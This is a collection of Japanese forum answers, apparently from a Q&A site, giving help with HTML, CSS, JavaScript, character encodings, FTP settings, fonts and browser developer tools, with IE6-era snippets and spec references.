(1)CSSで例えば、 #contents { background-color:#FFFFFF; } とすると、 <div id="contents"> .back { padding:2px;} とすると、 <div class="back"> ですかね。 (2)携帯の振り分けで.htaccessでもいいんでしょうが、 私はPHPなどを使って振り分けています。 http://html-coding.co.jp/knowhow/tips/000218/ ここが参考になるんじゃないでしょうか。 カヤックさんだけに頼らんほうがいいです。 なお、最近の携帯はUTF-8にも対応しているみたいなんで、 カヤックさんが言うようにシフトJIS必須ってわけでもないと思います SP向けサイトと携帯向けサイトを共通化しても大きな問題はないんじゃないでしょうか。 私はそうしています。
doctype宣言の問題です <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitio … <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ja" lang="ja"> これを使ってください xml宣言はapacheでおかしくなることがあるのではずしてください <?xml version="1.0" encoding="UTF-8"?> doctype宣言に失敗しているのでレンダリングモードが互換モードに入っています
Headerを使うためには、拡張機能を追加した状態でApacheをインストールする必要があります。 なので、一般のレンタルサーバーでは使用できないと思います。 そのためCGIを使用してPragmaヘッダなどを出力するのが一般的だと思います。 http://tech.bayashi.net/pdmemo/browsercache.html
そもそもJavaScriptで移動させたいのか、アンカーで移動させたいのかどっちなんですか？ アンカーなら、No.3で答えが出てますし、JSでやりたいのであれば、JSが間違っている可能性もありますよ？ onclick="return false;"は、デフォルトのaタグの動作をキャンセルする為に入れています。 しかし、<a href="/" onclick="hoge();return false;">でルートにページ遷移する場合は、onclickが正常に動作していないと思われます。
body全体にも標準でマージンがあるので、bodyタグに対してmarginを0にセットすれば余白はなくなります。 body { margin: 0 auto; } これでヘッダー上部分の余白がなくなります。 ご参考まで。
＞動画のほうが少ないスペースにもみえるので 　タブに何文字を当てはめるかは、ある程度以上のエディタなら自由に指定できます。 　私はHTMLのときは、半角４文字に指定しています。メモ帳などは確か８文字固定・・
参考だけ。いわゆるポッドキャストの貼り方をすると、 ブラウザのデータ形式定義により取り扱われるので、 アンドロイドだとプレーヤー直起動（保存は長押しから）で反応しました。 がPCはそれだと問題で個々アプレットのプレーヤーだったか。
フォームコントロール(inputも)name属性を持ちますよ。そしてresetを除くフォームコントロールのnameの値とvale値はサーバーに送信されます。 すなわち、text password checkbox radio submit file hidden button よって <input type="submit" name="SW1" value="1で決定"> <input type="submit" name="SW2" value="2で決定"> <input type="submit" name="SW3" value="3で決定"> とか・・・ ★17.4 INPUT要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) また、BUTTON要素を使っても良いでしょう。そのほうが内容をもてるので使いやすいかも ★17.5 BUTTON要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　わからないときは仕様書を読む癖をつけましょう。それでわからないときに、この様な掲示板を利用すると中途半端な回答や不正確な回答で終わることもありませんし、何より身につきます。
＞Webサーバーがインターネット上(外部)だとダメという事でしょうか？？ 　そりゃそうです。インターネット上から接続している誰かのコンピューターのIPアドレスで156.685.24.12/C:\windows 　なんて指定されて読まれたらまずいでしょう。 　あくまでイントラネット上にサーバーが必要と言うことです。 　たって、<a href="・・といった時点で、HTTPなり、FTPなりのプロトコル使うわけですから・・ 　なお、fileマネージャを使う場合、直接ファイルを指定するならOKですから、 <a href="file:///C:/Document and settings/My Document/index.html としておいて、このindex.htmlにファイルへのリンクを書くのならいけるはずです。
クリックなら、onClickじゃないの？ <a href="http://www.***/***1/" onClick="bg.src='../***2/***3.wav';return false"> または <a href="javascript:void(0);" onClick="bg.src='../***2/***3.wav'"> または<head>内などに・・ <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.5. … <script type="text/javascript"> $(function(){ $('a[href=http://www.***/***1/]').click(function(e){ e.preventDefault(); }) }); </script>
＞皆様へ：どうやって学ばれましたか？独学で学べるものでしょうか？ 　皆さんは知りませんが、私は独学です。 　書籍は古い・・・原稿を書き始めて仕上がって出版するまでに最低でも一ヶ月かかる。通常はもっとかかるでしょう。そして完成したとたんに日々、陳腐化していく。 　そんな状態ですから、最新の情報を教えてくれる人はいない。日々追いかけていくのが大変で、教材が出来たと同時に日々過去のものになっていく。 　いえね、私の立場からよくわかるのですが、基本的に教壇で教えられる内容は、とっても古いものです。大学でさえ・・、卒業研究生活に入ってはじめて最新の情報に触れる。 　そしてこの世界の進歩はとても早い・・。しかし、それが普及するにはとてつもなく長い時間がかかる。現在ウェブ標準とみなされている1999年勧告のHTML4.01strict(transitinalやframesetじゃない)＋2011年勧告のCSS2.1の使われ方を見ていても、とてもじゃないけど活用しているとは思えない。 　現在のほとんどのブラウザ(IEを除く)は、これらに対応していますが、それらをうまく使い切っているソースはほとんど見ません。 　まあ、少なくともHTML4.01やCSS2.1の仕様書くらいは一通り目を通しておくと良いでしょう。そして今策定中のHTML5やCSS3の最新の情報を追いかけること。幸いに優れた邦訳も数ヶ月もすれば誰かが公開してくれる。 　私はとっくに還暦過ぎましたが(^^)、幸いに昔からその方法なのでまだ乗り遅れてはいないと思う。そのうち付いていけなくなるかもね。 　
<!-- /* ナビ画像も伸縮させる */ html,body{margin:0;padding:0;} div.header,div.section,div.footer{width:100%;min-width:480px;max-width:900px;margin:0 auto;} div.header{position:relative;} div.header h1,div.header div.abstract{ ＿margin-right:30%;/* 幅固定ならpxを */ } div.header div.nav{ ＿position:absolute;top:0;right:0; ＿width:29%;/* 幅固定ならpxを */ ＿height:100%; } div.header div.nav ul{ ＿position:absolute; ＿bottom:0; ＿width:100%; } div.header div.nav ul,div.header div.nav ul li{display:block;list-style-type:none;margin:0;padding:0; } div.header div.nav ul li{float:left;width:49%;position:relative;margin-left:1%;} div.header div.nav ul li img{display:block;width:100%;height:auto;} /* 色分け */ body{background-color:gray;} div.header,div.footer{background-color:silver;} div.section{background-color:white;} div.header div.nav{background-color:yellow;} --> 基本は、No.1の考え方と同じです。
こんにちは。 先のサンプルページから参照できるjquery.datetime.jsを新しいものにしておきました。 そちらを参考にして下さい。 今回の仕様追加により修正した部分があるのでご注意ください。 修正点 ・年月変更時にMAX日数を設定するようにしたが、初期表示時の考慮が抜けていたため、2012年2月で初期表示した場合に31日まで表示されていた
FTPクライアントソフトウェアには文字コードの設定があることが多いです。 ではこれはHTMLの文字コードと関係があるか？というと、関係ありません。 ではFTPクライアントの文字コード設定とはなんの意味があるのか？というと ファイル名の文字コードに関する設定です。 サーバとクライアントでファイルの文字コードが異なる場合でも、 設定を正しく行うことでファイル名の文字化けを防ぐことができます。 # 一般的なクライアントでの話です。そんな設定がないクライアントも存在します。
不必要なclass名やidを書き連ねるとHTMLもCSSも煩雑になります。折角のCascading style Sheetなのですからカスケーディングを使わなきゃ・・ ・継承するものは継承させる。 ・同じプロパティはセレクタのグループ化で一度しか書かない ・セレクタで特定できるものまで、不必要なidやclass名は書かない。 ・ひとつのHTML要素に関わる部分は、スクロールなしに見渡せるよう整理する。 　サンプルは外形だけですが、HTMLもスタイルシートもこんな簡単でわかりやすいもので済むはずです。それでいて、スマートホンから幅広ディスプレイに対応しています。(ウィンド幅を伸縮して確認してください。また、固定スタイルにするときは設定を変更してください。) 　まあ、スタイルシートは20～30行程度に抑えるとメンテナンスが楽です。 　プルダウンメニューについて、本来はdispaly:inline-block;とtext-align:centerを組み合わせるべきですが、古いブラウザを考慮するとfloat:leftも致し方ないでしょう。 　 ★いずれも、タブが全角スペースに置換してあるので戻すこと。 [HTML]class名のnavはHTML5の要素名、将来HTML5に変更すると気楽なので・・ <div class="nav" id="global-nav"> 　<ul> 　　<li>イメージ画像</a> 　　　<ul> 　　　　<li>ドロップダウン</li> 　　　　<li>ドロップダウン</li> 　　　　<li>ドロップダウン</li> 　　　</ul> 　　</li> 　　<li>イメージ画像</a> 　　　<ul> 　　　　<li>ドロップダウン</li> 　　　　<li>ドロップダウン</li> 　　　</ul> 　　</li> 　　<li>イメージ画像</a> 　　　<ul> 　　　　<li>ドロップダウン</li> 　　　</ul> 　　</li> 　　<li>イメージ画像</a> 　　　<ul> 　　　　<li><a href="dl-1.html">ドロップダウン</a></li> 　　　　<li><a href="dl-2.html">ドロップダウン</a></li> 　　　　<li><a href="dl-3.html">ドロップダウン</a></li> 　　　</ul> 　　</li> 　</ul> </div> [CSS]子セレクタやinline-blockを理解しない古いブラウザを考慮して長ったらしくなってます。 div.nav ul,div.nav ul li{ 　display:block;list-style:none; 　margin:0;padding:0; 　line-height:40px;text-align:center; } div.nav ul{ 　width:80%;height:40px; 　margin:0 auto;min-width:640px;max-width:1000px; 　background-color:#999; } div.nav ul li{width:25%;float:left;position:relative;} div.nav ul li ul li{float:none;background:#d1d1d1;} div.nav ul li ul{width:100%;position:absolute;background-color:transparent;} div.nav ul li ul{display:none;} div.nav ul li:hover ul{display:block;} div.nav ul li a{display:block;}
いえ、 <input type="text" name="q" size="25" /> を <input type="text" name="as_epq" size="25" /> に変えるのです。 色々手は入れられますよ(^^) たとえば、 <input type="hidden" name="tbs" value="qdr:y5,sbd:1"> ワ追加すると５年間のデータを更新日時順に並べるとか・・ ★ＧＯＯＧＬＥカスタム検索結果を新しい日付順にしたい - HTML - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7565865.html ) 　ここにフォーム自体の説明もしてあります。
検索後のgoogleに、絞込みができるように選択肢が左にあるはずです。 それを選択して再検索すると、URL欄が変わるはずですね。 　これは、検索エンジンに対してQUERY_STRINGで検索条件を渡しているということです。 詳しくは、 ★17.13 フォームの提出 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　などを調べてください。(ウェブサイトを作られているので、仕様書はすでに読まれていると思いますので失礼かも) 　絞込み前と、絞込み後のURL欄を比較すると、たくさんの&で区切られた条件がありますが、その中に &tbs=qdr:w,sbd:1 　・・・一週間以内、日付順を選択したとき・・ があります。 　そのことから、[name]=[値]のnmaeはtbs、値は、qdr:w;sbd:1 であることがわかりますね。 　よって、検索で渡される--フォームの提出にこの [name]=[値] を追加すれば良いわけですから、 <form *****> ・・・・ 　<input type="hidden" name="tbs" value="qdr:w,sbd:1"><!-- これを追加 --> ・・・・ </form> 　すると良いと判断できますね。 　その他様々なgoogleの検索オプションにある絞込みを追加できます。それぞれどのような{name]=[値]なのかは、自分で調べてください。 　ここまではヒントです。これ以上は自分で調べてください。でないと身につかない。それと仕様書くらいは、一度全部目を通しておくと良いでしょう。(もう読まれているかも)
floatを解除するためのclearだと思います。 そもそも、「divタグに<class="cl">を入れる」というのは、明らかに変です。 floatは、テキスト中にある画像の周囲に本文記事を回りこませるためのプロパティであることはご存知だと思います。 [基本的な使い方] <div class="section"> 　　<h2>見出し</h2> 　　<div class="figure"><!-- figure:(英)挿絵 --> 　　　　<p><img></p> 　　　　<p>画像の説明</p> 　　</div> 　　<p>本文記事</p> 　　<p>本文記事</p> </div> <div class="section"> 　　<h2>見出し</h2> 　　<p>本文記事</p> ・・・・ 　と言う構造の文章があるとき、挿絵のブロックを右側にfloatさせたいときは、 div.figure{width:240px;float:right;margin:0.5em 1em;font-size:0.8em;} div.section{clear:right;} と言う風に使います。 (HTML/CSSについて) 　HTMLは文書構造をマークアップするものです。用意されている要素(タグで示される)で足りないとき、idやclass名をつけて文書構造を示します。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　この部分がわかりにくかったので、HTML5では『文書をよりよく構造化するために、・・・要素が新しく追加されました。 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』 　すなわち、sectionやfigure,footer,header,navなどです。 　もちろん、ここでclass名は必要すらなくて 　　<h2>見出し</h2> 　　<div class="figure"><!-- figure:(英)挿絵 --> 　　　　<p><img></p> 　　　　<p>画像の説明</p> 　　</div> 　　<p>本文記事</p> 　　<p>本文記事</p> 　　<h2>見出し</h2> 　　<p>本文記事</p> ・・・・ で、 div.figure{float:right;*****} h2{clear:right;} でも十分です。 「divタグに<class="cl">を入れると(margin: 0 auto;)が効かなくなります。」 　divであろうとなかろうと、divに指定してあるmarginは生きているはずです。floatする要素についてもmarginは有効です。ただし、floatする要素は、本文とは切り離されまか。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 浮動体は通常フローに属していないので、その前後に生成される位置指定されていないブロックボックスは、浮動体が存在しないかのように流し込まれる。 　・・・【中略】・・・ 浮動ボックスのマージンが、隣接するボックスのマージンと相殺し合うことは決してない。 したがって前の例において、P要素のボックスと、IMG要素の浮動ボックスの間でマージンが相殺されることはない。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［視覚整形モデル( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )］より もし、段組にfloatを使われているのでしたら、それは本来の段組ではありません。 →Webデザインにおける段組 ( http://ja.wikipedia.org/wiki/%E6%AE%B5%E7%B5%84# … ) →ＣＳＳについて教えてください - ホームページ作成ソフト - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7539718.html ) 　本来の、absoluteを使って段組をすると問題は解決すると思います。
私からも質問してよろしいでしょうか？　貴方は高校生・大学生・大人のどれですか？ ■<object id="FlashID"classid="clsid:D27CDB6E-AF6D-!!cf-96B8-4445535"width="700"height="119">■ ☆id="FlasID"　特に意味がありません。有っても無くても特に問題は無いと思います。（今までの経験上） ☆classid="clsid:D27CDB6E-AF6D-!!cf-96B8-4445535"　これは説明が長くなるのでこちらを参照　http://bakera.jp/ref/html/attribute/classid　わかりやすいですよ ☆width="700"height="119"　これは幅と高さを指定しています。基本単位はpxです ☆objectの後に&nbspを入れるのはHTMLの決まりで「objectには均等な内容を入れましょう」となっています。あるブラウザではこれに文字を入れてしまうと表示サれてしまうので、スペースを入れときます。ただ単にスペースを入れては意味がないので「&nbsp」を入れます ■入れ子とは■ 添付した画像を見ればわかると思いますが、<div id="yokohamasen">の後にどんどん凹んでいるのがわかると思います。これが入れ子上です。<object>の中に<param>が入っているのも入れ子です。 ■おまですがインデントとは■ 画像のようにスペースが入っています。このようにしておくとメンテナンス性が上がります。入れ子状にすれば必然的に必要となります ■</div>を消さない理由■ <div>には終了タグがあります。これがないと意味を成さないので絶対に必要になります
まず、どういう状況でどういう処理をしたいかをきちんと整理してください。 　フローチャート的なものを書いてみるのが良いです。 　その際に、ユーザー側で保存する情報とサーバー側で保存する情報をきちんと区別すること。 　質問ではわからないのですが、[受領ボタン]を押すと、特定のファイルがダウンロードされ、それを確認して、ユーザー側に渡されるHTMLを書き直すのでしたら、 　[要求] 　　| 　[クッキー照合] 　　| 　[データベース確認] 　　| ＜ダウンロード済みかを確認＞ 　　| 　　| [HTML作成] 　　| 　(出力)--クッキー発行 サーバー処理 (ダウンロード要求) 　　| [出力] 　　| [ダウンロード照合]データ長など 　　| [データベース書き換え] とかですかね。
リファラをチェックすればある程度いけるかもしれませんね
＞そのサイトを見ると自動的に専用サイトへ振り分けてくれるサイトってあると思うのですが、 　処理自体は、ユーザーから送られてくるHTTP_要求ヘッダに含まれるuser agentを判断して異なるコンテントを送出します。 　しかし、その方法はよほど特殊な場合だけで、本来のウェブの考え方としては誤りと言っても良いでしょう。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。 なぜならただ1種類の文書しか作る必要がなくなるからだ。 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 　・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　本来HTMLは、たった一つの文書で様々なユーザーエージェントが利用できるように考案されたものです。 　スタイルシートの書き方ひとつで済むことを、わざわざ面倒くさい手段を使わなくても良いのではないかと
HTMLとCSSについて基本は理解しておきましょう。でないと、単純なところで先に進めなくなります。 　SSI経由だろうが無関係にHTMLは <h1>私のホームページ</h1> <p> <a href="a.html">HOME</a> <a href="b.html">紹介</a> <a href="c.html">日記</a> <a href="d.html">LINK</a> </p> <H2>日記</H2> 　　<P> 　　　　私の日記です。お暇な方はどうぞ。 　　</P> となるはずですね。(余分な文字が入っていない限り) これを <span>私のホームページ</span> <p> <a href="a.html">HOME</a> <a href="b.html">紹介</a> <a href="c.html">日記</a> <a href="d.html">LINK</a> </p> <H2>日記</H2> 　　<P> 　　　　私の日記です。お暇な方はどうぞ。 　　</P> とすると、「ページ上部に隙間ができない」と言うことですが、HTMLを見る限り逆にはなっても、そうはならないことが理解できると思います。 　HTMLの要素には、ブロック要素とインライン要素( ブロックレベル要素と行内要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) )があることはご存知でしょうが、<h1>や<p>はブロック要素で<span>はインライン要素です。 　スタイルを一切記述せずにHTMLをブラウザの持つデフォルトのスタイルシートでご覧ください。多くのブラウザは下記のようなスタイルを持っていることが多いです。 ★HTML 4.0におけるスタイルシートの例 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　そのうえで、スタイルシートでプレゼンテーションを変更していきます。 ※このとき、 * { margin: 0; padding: 0; } のような指定はすべきではありません。*は全称セレクタで詳細度こそ0ですが、ブラウザの持つすべての要素のmarginとpaddingをリセットしてしまいます。そのため、pやh1～h6、blockquoteや各リストやリスト項目のそれらも改めて設定しなければならなくなり、スタイルシートが煩雑になります。必要なものだけ指定しましょう。 　h1に対して、詳細度0,0,0,1で、再びmarginやpaddingを指定していますから、この*を使っての指定は意味ないはずですし・・ 　示されたHTMLやCSSを見る限り、あなたがいわれる現象にはならないはずです。どこかでより高い優先順位か詳細度でマージンを指定しているとしか考えられません。 ★CSSは{カスケーディングスタイルシート}の略です。カスケーディング機能がこのスタイルシートの【命】です。セレクタ・出所・最優先宣言・出現順番・継承・詳細度などを含む大変重要な仕組みです。marginとかfont-familyなどのプロパティより先に身につけるべき、極めて重要な仕組みです。 　5.セレクタ ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　6.値の割り当て、カスケード処理、継承 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　 　なお、firefoxのアドオンにfireBug( https://addons.mozilla.jp/firefox/details/1843 )という解析ツールがあります。それをつかうと、どの要素にマージンがあるかたちどころにわかるでしょう。他の開発者向けツール ( https://addons.mozilla.jp/firefox/extensions/dev … )と共に使われると良いでしょう。
私は経験がないのでわかりませんが、それを囲むA要素やP要素にtitleが記載されているとか、スタイルシートで内容の追加(content:)が書かれているとか、javascriptでとか・・ 　ただ、altは代替文字ですから <img src="[URL]" title="山中湖から富士山を望む" alt="山中湖からだと富士山は湖面に映り、夕焼けのときは最高"> 　と言う風に・・その画像の目的に合わせて記述すべきでしょう。意味のない画像でしたらaltは書かないのではなく""と値を空にするとか・・。
アニメーションGIF だと思います。 アニメーションGIF 作成ソフトで可能です、パラパラ漫画のように何枚かの画像ファイルで構成されています。
　Windows に最初から入っている書体は、【ＭＳ 明朝／ＭＳ Ｐ明朝】【ＭＳ ゴシック／ＭＳ Ｐゴシック】【メイリオ（Vista 以降）】の三系統です。ここにヒラギノがないため、Windows では上記の書体で表示されるわけです。 　そこで、Windows 用にヒラギノを購入――という話になりますが、お買い得なのは【一太郎2012】の【プレミアム／スーパープレミアム】だと思います。または、下記ふたつ目のサイトのように、ヒラギノだけを単品で購入する方法もあります。 　◆美しく読みやすい ヒラギノフォント｜日本語ワープロソフト 一太郎2012 承 　　http://www.justsystems.com/jp/products/ichitaro/ … 　◆明朝体の検索結果：フォント - Font Garage 　　http://font.designers-garage.jp/ds/execute/FontS … 　ただし、Windows の画面表示は貧弱であるため、【MacType】のような外部アプリケーションを追加しないと美しくなりません。参考 URL をご覧いただくとわかりますが、話題のウェブフォントも Windows ではガタガタで、Mac やスマホのほうが綺麗です。 　◆窓の杜 - 【REVIEW】Windows上のあらゆるフォント表示を劇的に美しくする「MacType」 　　http://www.forest.impress.co.jp/docs/review/2012 … 参考URL：http://wakufactory.jp/densho/TypeSquare/hikaku.h …
というか、その場合は正規表現を使って一挙に変換しますけど・・・ それじゃまずいのですか?
「+新しいアカウント」から追加でしょう。
No.3です。 　ちょっと説明不足でした。 　どこに書かれているかでスタイルを変える場合は、子孫セレクタか子セレクタをつかって指定します。 　div.header a{}は<div class="header">内にある、子孫(子供・孫・曾孫・・)のa要素です。div.footerも同様・・ 　なお、質問のタイトル「リンク先の背景色」でしたら、 <a href="./index.html">トップへ</a>と<a href="./profile">プロフィール</a>で背景色を変えたいなら、 a[href="./index.html"]{background-color:red;} a[href="./profile"]{background-color:yellow;} で背景色を変えます。要素セレクタと言います。
お約束として…FFFTPの設定、間違っていたりしませんか？ # FTTTPってFFFTPの間違いですよね？ テキストファイルの転送時にファイルの文字コードを変換するようになっていたりしませんか？ 改行コードでちょっと問題になるかも知れませんが、バイナリモードで転送してみてはどうです？ あと、元ファイルにBOMとかついていたりしませんか？ 名前をつけて保存したら… E3 83 BB EF BD BF 3C 21 44 4F 43 54 59 50 45 とか、先頭にヘンなの付いていましたけど。 # <!DOCTYPEの前に6バイトほどヘンなのが……。 # UTF-8変換されたとして…元は38 FB FF 7F？ BOMじゃなさげ…。
http://windows.microsoft.com/ja-JP/windows/downl … まず、Firefox用のWindows Media Playerをインストールしてください。 そうすれば、<object>か<embed>を使ったどの書き方でも表示できるようになると思います。 codeパラメータ、pluginspageのURLは以下の方にする方が良いと思います。 http://windows.microsoft.com/ja-jp/windows/produ …
Another HTML Lint ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) The W3C Markup Validation Service ( http://validator.w3.org/#validate_by_uri ) とか、FirefoxのHtml Validator ( https://addons.mozilla.jp/firefox/details/249 ) とか、あるいは表示されていない画像部分のソースを見れば、すぐわかるはずだけど・・ <p><img style="width: 640px; height: 2880px;" src="[略]"><br><br></p> 画像にサイズがないです。
こんにちは。 私のWindowsXP32Bit+IE8では背景が黄色になって「はい」「いいえ」のリンクが出てきています。 動かないとはどのような状態でしょうか？
ここまでFC2サーバー ＞Content-Type: application/rdf+xml ローカルサーバー ＞Content-Type: application/octet-stream ですね。 サーバーの.htaccesで、addtypeで、mimeタイプの指定をしますが・・・ 不思議なのは application/octet-stream は、通常はダウンロードの指定なのでが・・・
Perlでも考え方は同じですよ
いや、仕様書に詳しく書かれているのでそれをお読みくださいとかいえません。 とても長く複雑で、この様な掲示板で回答するには荷が重過ぎますし、可能だとしても誤解を招きます。 ＞CSS2.1仕様書 17 Tables ( http://www.w3.org/TR/CSS2/tables.html ) ここに、 　17.5.2 表の幅を計算する ( http://www.w3.org/TR/CSS2/tables.html#width-layout ) 　17.6 ボーダー ( http://www.w3.org/TR/CSS2/tables.html#borders ) 　17.6.2 結合ボーダーモデル ( http://www.w3.org/TR/CSS2/tables.html#collapsing … ) 　　17.6.2.1 ボーダーの競合を解決する( http://www.w3.org/TR/CSS2/tables.html#border-con … ) 　　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ が該当する部分です。 ［特に］ 1. Borders with the 'border-style' of 'hidden' take precedence over all other conflicting borders. Any border with this value suppresses all borders at this location. 2. Borders with a style of 'none' have the lowest priority. Only if the border properties of all the elements meeting at this edge are 'none' will the border be omitted (but note that 'none' is the default value for the border style.) 3. If none of the styles are 'hidden' and at least one of them is not 'none', then narrow borders are discarded in favor of wider ones. If several have the same 'border-width' then styles are preferred in this order: 'double', 'solid', 'dashed', 'dotted', 'ridge', 'outset', 'groove', and the lowest: 'inset'. 4.If border styles differ only in color, then a style set on a cell wins over one on a row, which wins over a row group, column, column group and, lastly, table. When two elements of the same type conflict, then the one further to the left (if the table's 'direction' is 'ltr'; right, if it is 'rtl') and further to the top wins. は、その前文と共に重要です。 　tableに関しても、現行のCSS2.1は、CSS2より、いくつか改定されていますが、残念ながら邦訳を知りません。 　CSS2の邦訳は、こちら( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )にあります。
CSS的には違いはないかと思います。(もしかしたら些細な差はあるかもしれませんんが、問題になることはほとんどないはず) Webデザインという括りで言うなら、フォントの違いが大きな違いでしょうね。ご存知のように、XPはMSゴシック/明朝が標準の日本語フォントですが、VISTA以降はメイリオですね。加えて、アンチエイリアス処理(文字を滑らかに表示する機能)の違いも注意する点です。 フォントが異なって見えるだけで、もうほとんど違うデザインに見えてしまうものです。と言っても、Webというのはそういうメディアですが。 既に回答ありますが、ユーザーを狭く限定するなら話は別ですが、今となっては、IE8だけ表示を確保しても、インターネットに接続する大部分を逃してしまうでしょうね。PCのブラウザだけでも沢山ありますし、スマフォ、携帯、テレビ、ゲーム機などなど。大事なのは、正確なCSSを書くことだと思います。
いまどきIE6ですか？？・・マイクロソフト自身も撲滅キャンペーン( https://www.google.co.jp/search?q=%E3%83%9E%E3%8 … )しているのですが・・ 　それはさておき、荒くなったのはテキストですよね。フォントはベクターイメージ - Wikipedia ( http://ja.wikipedia.org/wiki/%E3%83%99%E3%82%AF% … )ですから、それをラスターイメージ ( http://ja.wikipedia.org/wiki/%E3%83%A9%E3%82%B9% … )にしたら、だめです。 　もし送られてくるデータがWordでしたら、Ctrl+Altで全部を選択してCtrl+Cでコピーして、テキストエディタに貼り付けて、マークアップします。 　画像は、画像のコンテキストメニューからコピーして適当な画像処理ソフトに貼り付けて画像ファイルを作成します。 　質問のタイトルがPDFとなっていますが、質問文はWordです。PDF化されている場合も同様です。ただし、全体が画像としてPDFされている場合は、この方法は使えませんからOCR機能を使ってテキストを取り出します。acrobatをお持ちでしたら、確か7あたりからはOCR機能が付いていたと思います。
開発ツールは、ウエブ開発者向けのツールなのですが、それはソースを確認したり、バグを見つけたり。 　この部分は、Netscape由来のfirefoxが断然進んでいまして、Webオーサリングツール,メールクライアントと統合されたSeaMonkey ( http://www.seamonkey.jp/ )がある。Netscape Goldはエディタを昔から持っていた。 　firefoxも同様に開発者ツールが付属していますが、DOM inspectorは、javaやスタイルシートを記述するときに、DOM構造がわかりやすくて良いですが、それ以外に豊富な 開発者向けツール ( https://addons.mozilla.jp/firefox/extensions/dev … ) 　があります。私が使っているものだけでも ・ Firebug ( https://addons.mozilla.jp/firefox/details/1843 ) ・ Server Switcher ( https://addons.mozilla.jp/firefox/details/2409 ) ・ Html Validator ( https://addons.mozilla.jp/firefox/details/249 ) ・ IE Tab V2 (Enhanced IE Tab) ( https://addons.mozilla.jp/firefox/details/92382 ) ・ Web Developer ( https://addons.mozilla.jp/firefox/details/60 ) ・ Live HTTP Headers ( https://addons.mozilla.jp/firefox/details/3829 ) ・ JSView ( https://addons.mozilla.jp/firefox/details/2076 ) ・ Pearl Crescent Page Saver Basic ( https://addons.mozilla.jp/firefox/details/10367 ) ・ 再起動ボタン ( https://addons.mozilla.jp/firefox/details/8462 ) ・ FireMobileSimulator ( https://addons.mozilla.jp/firefox/details/8519 ) あります。 　特に、firebugは、その場で変更や変更後の適用なども判断できるので便利ですね。 　テキストエディタは自由に設定できますから、ソース編集で任意のテキストエディタを使えます。 　別件ですが、この回答を記述するテキストエリアもボタンひとつで他のテキストエディタを起動できます。 ・It's All Text! ( https://addons.mozilla.jp/firefox/details/4125 ) 　上記のたくさんの参考サイトのリンクは ・Make Link ( https://addons.mozilla.jp/firefox/details/142 ) 　で簡単に書ける。もちろん<a href="****なんてのも、正確に作ってくれる。 　豊富な開発者向けのアドオンといったら、やはりfirefoxでしょうね。
たぶん、翻訳すると Webオーサリングツール ( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … )を使わずに、HTMLやCSS---ウェブページを作成するHTMLエディタ ( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … )は? 　たくさんの種類のHTMLエディタがありますが、私も色々使ってきましたが、現在は機能が豊富なテキストエディタ EmEditor ( http://jp.emeditor.com/ )を使っています。EmEditor Free ( http://jp.emeditor.com/modules/download2/rewrite … )もありますが・・・ 　様々なブラウザでプレビューをするのもワンクリックでできるように設定できます。 　これと、firefoxの開発者向けツール( https://addons.mozilla.jp/firefox/extensions/dev … )のいくつかを併用すると下手なオーサリングツールより効率的です。 　 　
背景として使われてるpng画像はbg-wrap1～3.pngの三つで、 その内透過されてるのはbg-wrap2.pngだけですね（質問者さんも確認済み）。 IE6で透過pngを表示させる方法としてはCSS、JavaScriptで実装可能です。 提示されたサイトではJavaScriptの方法が使われていて、index.htmlの422行目から425行目 <!--[if lte IE 6]> <script type="text/javascript" src="/js/DD_belatedPNG.js"></script> <script type="text/javascript">DD_belatedPNG.fix('#wrap2, .png');</script> <![endif]--> が該当してるようです。 当方IE6環境がなく検証出来ませんが、JavaScriptを切って確認してみてください。
